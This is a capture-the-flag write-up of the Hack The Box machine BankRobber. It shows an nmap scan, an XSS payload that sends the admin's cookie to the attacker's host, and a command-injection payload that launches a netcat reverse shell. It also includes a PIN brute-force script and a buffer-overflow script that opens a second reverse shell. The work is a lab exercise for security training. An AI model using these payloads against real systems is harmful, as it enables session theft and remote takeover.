---
layout: post
title: Bankrobber.htb walkthrough
---

In this post I am trying to walk you through BankRobber (hack the box machine)


# 1-Initial Recon:
## nmap Tcp service scan :
```
Nmap scan report for 10.10.10.154
Host is up (0.15s latency).
Scanned at 2020-03-06 07:28:33 CET for 73s
Not shown: 996 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 1h02m04s, deviation: 0s, median: 1h02m04s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 26952/tcp): CLEAN (Timeout)
|   Check 2 (port 18812/tcp): CLEAN (Timeout)
|   Check 3 (port 52758/udp): CLEAN (Timeout)
|   Check 4 (port 46700/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-06T07:31:11
|_  start_date: 2020-03-06T06:06:14
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

It shows that there is a web service running on that machine, since web is the largest attack surface let’s take a look…

![]({{ site.baseurl }}/images/BankRobber-Writeup/1.png)

some sort of crypto currency website … interesting.
Also there is login/register functionality
After registering and logging in we see this form :

![]({{ site.baseurl }}/images/BankRobber-Writeup/2.png)

after trying to send some Crypto to a random id this alert pops up:

![]({{ site.baseurl }}/images/BankRobber-Writeup/3.png)

So the admin can review our request, here... the first thing to think about should be client side attacks such as xss to steal admin’s cookies

# 2-User Access

I did setup a local http server using python:

![]({{ site.baseurl }}/images/BankRobber-Writeup/4.png)

and sent this js payload through the comment section :

```
<script>new  Image().src="http://10.10.14.118/test?output="+document.cookie;</script>
```

and after some fails I got this reply:

![]({{ site.baseurl }}/images/BankRobber-Writeup/5.png)

After decoding username and password I got this :

![]({{ site.baseurl }}/images/BankRobber-Writeup/6.png)

After logging in with admin’s creds we could see this form:

![]({{ site.baseurl }}/images/BankRobber-Writeup/7.png)

if we try “whoami” :

![]({{ site.baseurl }}/images/BankRobber-Writeup/8.png)

but if we try “dir” :

![]({{ site.baseurl }}/images/BankRobber-Writeup/9.png)

so it accepts request only from localhost,
also if we try something like ‘dirabcd’ :

![]({{ site.baseurl }}/images/BankRobber-Writeup/10.png)

we see similar output as ‘dir’ . That means that our server accepts all strings that start with ‘dir’ but from localhost.That brings the first idea when we stole admin’s cookies . We can force him to do this request and execute some malicious command .
I did setup a directory and put nc.exe inside to use it as our reverse shell using smbserver.py
and hosted  this following js payload in a http server:

```javascript
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "backdoorchecker.php", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("cmd=diras || \\\\10.10.14.118\\www\\nc.exe -e cmd.exe 10.10.14.118 4445");
```
Which sends a post resuest to ‘backdoorchecker.php’ with our reverse shell.
I wrote a simple python script that sends xss payload every 50 seconds just because I am lazy and I don’t want to do it manually because it fails and takes some time to execute.

```python
#!/usr/bin/python
import requests , time
while True:

	s = requests.session()
	r = s.post("http://10.10.10.154/user/transfer.php",data={'fromId':'3','toId':'1','amount':'1','comment':'<script src="http://10.10.14.118/hello.js"></script>'},headers={'Cookie': 'Cookie: id=3; username=cGFwaQ==; password=cGFwaQ=='})
	print "[+] Payload sent..."
	time.sleep(50)

```
after some minutes I got my callback :

![]({{ site.baseurl }}/images/BankRobber-Writeup/11.png)

# 3-Privileges Escalation:

after surfing through directories I found this executable 'bankv2.exe' :

![]({{ site.baseurl }}/images/BankRobber-Writeup/12.png)

I was unable to execute it or download it since I have no permission
so I took a look at this :

![]({{ site.baseurl }}/images/BankRobber-Writeup/13.png)

That executable may have something to do with this port (910)

I forwarded it using plink.exe :

![]({{ site.baseurl }}/images/BankRobber-Writeup/14.png)

and connected to it

![]({{ site.baseurl }}/images/BankRobber-Writeup/15.png)

now everything makes sense. It requests a PIN but already giving us precious information about its length which is 4 digits
so I wrote this python script to bruteforce it :

```python
from pwn import *

print "Brute-Force for the PIN starts..."
ts = timeit.default_timer() # for logging purpose
for i in range (0,10000):
      sock=remote('127.0.0.1',910)
      res = sock.recv(1024) #receive first response
      sock.sendline(b'%04d'%i)
      t2=timeit.default_timer() - ts
      print("Trying PIN: %04d It took : %02d:%02ds" % (i,(t2-(t2%60))/60,t2%60)) #logging
      res = sock.recv(1024) #receive second response after sending pin
      print res
      if not "Access denied," in res :
              print "PIN found ! [%04d]" % i
              sock.close()
              break
      else:
              sock.close()
```
which gave me this result :

![]({{ site.baseurl }}/images/BankRobber-Writeup/16.png)

if we login with pin=0021 :

![]({{ site.baseurl }}/images/BankRobber-Writeup/17.png)

it asks for the amount to transfer and executes transfer.exe
if we try to overflow it :

![]({{ site.baseurl }}/images/BankRobber-Writeup/18.png)

we successfully overflowed the executable path . So we can execute any executable we want
- padding length is 32 bytes

![]({{ site.baseurl }}/images/BankRobber-Writeup/19.png)

I did put nc.exe in our users home dir since it refused to run over smb and wrote this little script to exploit it:

```python
from pwn import *
buf =  b""
buf += b'A'*32
buf += b'C:\\users\\cortin\\nc.exe 10.10.14.118 9000 -e cmd.exe '
sock=remote('127.0.0.1',910)
res = sock.recv(1024)
sock.sendline(b'0021') #login
res = sock.recv(1024)
sock.sendline(buf)
sock.interactive()
```
and after runnig it :

![]({{ site.baseurl }}/images/BankRobber-Writeup/18a.png)

Bingo! we got our shell

![]({{ site.baseurl }}/images/BankRobber-Writeup/18b.png)

Thanks for reading,I hope you enjoyed my first write-up .

![](https://www.hackthebox.eu/badge/image/22395)
